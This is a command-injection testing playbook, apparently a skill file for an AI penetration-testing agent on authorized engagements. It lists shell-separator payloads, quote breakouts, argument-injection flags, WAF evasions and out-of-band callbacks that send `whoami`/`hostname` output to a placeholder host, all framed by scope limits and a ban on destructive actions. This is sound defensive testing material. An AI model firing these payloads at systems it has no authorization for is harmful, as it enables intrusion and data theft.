---
name: command-injection-testing
description: "Invoke this skill when testing an authorized endpoint/parameter for OS command injection (coverage class `rce`): shell-metacharacter breakout via separators (`;`, `|`, `&`, `` ` ``, `$()`, newline), blind detection by time delay or OOB DNS, and argument injection. Covers detection, non-destructive confirmation, and a bounded proof, then recording the result (report_finding when confirmed)."
---

# Command Injection Testing (coverage class: `rce`)

> **Platform note (hainguyen0207):** this skill comes from a variant with an exploit-coverage matrix. This platform has
> no `record_coverage_cell` / `record_methodology_gap` tools. Wherever the text says to record or close a matrix
> "cell" (one endpoint × parameter), follow **Recording the result** below instead: `report_finding` for a
> confirmed issue, otherwise a per-parameter test summary in your result. `traffic_ref` = the request ids you get
> from `traffic_search` (the recording proxy). Destructive steps are gated by the platform's red-set sign-off.

A per-class testing playbook that turns one `(endpoint, param)` cell of the
exploit-coverage matrix from `untested` into `tested`, `finding`, or a proven
`n/a`. It is the hunting detail behind the matrix: send attempts through the
recording proxy, read the app's reaction, adapt, and record the trail. Use it
alongside `api-security` (which maps where parameters live and which inputs feed
system actions) — this skill decides whether a given input reaches an OS shell.

Attribution: adapted from the `command-injection-testing` skill of
[AntiFox-AI/antifox](https://github.com/AntiFox-AI/antifox) (AGPL-3.0). Rewritten
in English, gated for authorized engagements, and bound to the coverage matrix;
no source was copied verbatim.

## Boundaries

- Authorized scope only. The endpoint must be in the task's scope; never pivot to
  a host or parameter the engagement did not authorize, and never use a confirmed
  injection to reach another system.
- Non-destructive by default. Detection and confirmation use read-only, side-effect-free
  commands (`id`, `whoami`, `hostname`, `uname -a`, a bounded `sleep`). Never run
  commands that write, delete, move, or fetch-and-execute files, open a reverse or
  bind shell, add users, or touch cron/startup — those cross the destructive line
  and require the operator's sign-off (the red-set gate), not your own decision.
- Proof, not exfiltration. Confirm with the minimum: the output of `id`/`hostname`,
  or a single controlled out-of-band callback that proves execution. Do not read
  secrets, dump `/etc/shadow`, or enumerate the filesystem; one controlled value is
  sufficient evidence.
- Blind probes are bounded: use a short, unambiguous delay (e.g. `sleep 5`) once to
  confirm, not a scaled or repeated load that degrades the service. OOB callbacks go
  to a collaborator/interactsh host you control and are in scope.
- Every claim needs a replayable artifact: the exact request, the exact response
  (the reflected output, the measured delay, or the captured OOB interaction),
  captured in the recording proxy.

## Method

Work one parameter at a time. Baseline first, then escalate only as the response
justifies it. Keep the injected command harmless at every step.

### 1. Reach and baseline
- Find inputs that plausibly feed a shell: ping/traceroute/DNS tools, file and
  archive operations, image/PDF converters (ImageMagick, ffmpeg, pdftk), log
  viewers, backup/restore, and any field passed to a command-line utility.
- Record the normal response: status, length, timing, and the echoed/processed
  output, so every later payload is judged against a real baseline.

### 2. Detection (read-only)
- Separator breakout. Append a separator plus a benign command and look for the
  command's output in the response. Try each context:
  - chaining: `; id`, `| id`, `|| id`, `&& id`
  - inline substitution: `` `id` ``, `$(id)`
  - terminator/newline: `%0aid` (URL-encoded newline), `\nid`
  - Windows: `& whoami`, `| whoami`, `&& whoami`
- Quote-aware breakout when the value sits inside quotes in the command:
  close first, e.g. `"; id ;"`, `'; id ;'`, `"&&id&&"`.
- A separator form whose benign-command output (`uid=…`, a hostname) appears in the
  response is strong, direct evidence — capture the exact request/response.

### 3. Context identification
- Determine where input lands: a bare argument, inside single/double quotes, or as
  an option. This dictates whether you need to break out of quoting and which
  separators the shell will honor.
- Identify the OS and shell from output (`uname` vs Windows banners, path style) so
  later syntax and separators are correct.
- Distinguish true command injection from argument injection: when input is placed
  as a new argument to a fixed binary (not a shell), you cannot add separators, but
  you may be able to inject flags (e.g. `-o ProxyCommand` to ssh, `--use-compress-program`
  to tar, `@file` to curl). Prove it with a benign, in-scope flag effect.

### 4. Bounded confirmation (blind cases)
- Time-based oracle when no output is reflected: one bounded delay and compare to
  baseline timing — `; sleep 5`, `$(sleep 5)`, `& ping -n 6 127.0.0.1` (Windows),
  `| ping -c 5 127.0.0.1`. Confirm once; do not loop.
- Out-of-band oracle when the host can reach outward: trigger a DNS or HTTP callback
  to a collaborator you control, e.g. `; nslookup $(whoami).<your-oob-host>` or
  `; curl http://<your-oob-host>/$(hostname)`. The captured interaction (with the
  embedded `whoami`/`hostname`) is the proof. Keep callbacks to a handful.
- Stop at proof. Command execution shown by output, a measured delay, or a single
  OOB hit is enough; a shell, file writes, or data reads are out of bounds without
  sign-off.

### 5. Filter / WAF adaptation
- If separators or keywords are filtered, record the filter behavior and try
  context-appropriate, in-scope evasions:
  - space substitution: `${IFS}`, `$IFS$9`, a literal tab
  - keyword splitting: `i''d`, `i\d`, keywords assembled via variables
  - encoding: URL-encode the separator/newline; base64 the benign command and pipe
    to a decoder only if it stays non-destructive and in scope
  - path globbing: `/???/i?` style wildcards for a benign binary
- A blocked-by-WAF result is itself worth recording — it is not a proven `n/a`.

## Recording the result

Record every `rce` outcome so nothing is lost and nothing is re-tested:
- **Confirmed** - call `report_finding` with the exact replayable request and response (cite the proxy request
  ids from `traffic_search`), the injection point/context, and the demonstrated impact. The reporter agent then
  writes the full report; do not exaggerate severity beyond what you proved.
- **Tested, not vulnerable** - in your result, list each (endpoint, parameter) you tested for `rce`, the payload
  families tried, the app's reaction to each, the follow-ups those reactions prompted, and why you stopped. A
  single bare payload on a reachable parameter is NOT "tested" - adapt to what the response tells you.
- **Not applicable** - only with a proven reason the class cannot apply here (shown by evidence), never an
  assumption from the endpoint's name.

Reading source code or a config is not testing: a negative claim must rest on real requests sent through the
recording proxy.

## Tools

| Tool | Use | Notes |
|---|---|---|
| recording proxy + curl | send payloads, capture request/response for `traffic_ref` | always available |
| Burp (MCP, when connected) | Repeater/Intruder for iterative payloads; Collaborator for the OOB oracle | only where a Burp instance is wired |
| commix | automated command-injection detection/exploitation | NOT installed by default — verify (`command -v commix`) before use; if absent, use the manual method above and record the attempts. When present, keep it within scope and non-destructive: detection only, no `--os-shell`/`--file-write`/`--file-upload`/reverse-shell against a live target. |

Any OOB oracle needs a collaborator/interactsh host that is in scope and controlled
by the engagement; verify it is available, else fall back to the time-based oracle.

## Completion self-check

- [ ] Every `tested`/`finding` cell cites a real proxy request (`traffic_ref`) sent
      during this task, not a source read.
- [ ] Confirmation used a harmless command (`id`/`hostname`/`sleep`/OOB callback); no
      secrets were read and no filesystem was enumerated.
- [ ] No destructive command ran — no write/delete, no reverse/bind shell, no
      persistence — against the live target without operator sign-off.
- [ ] Any `n/a` cites evidence that input cannot reach a shell, not an assumption.
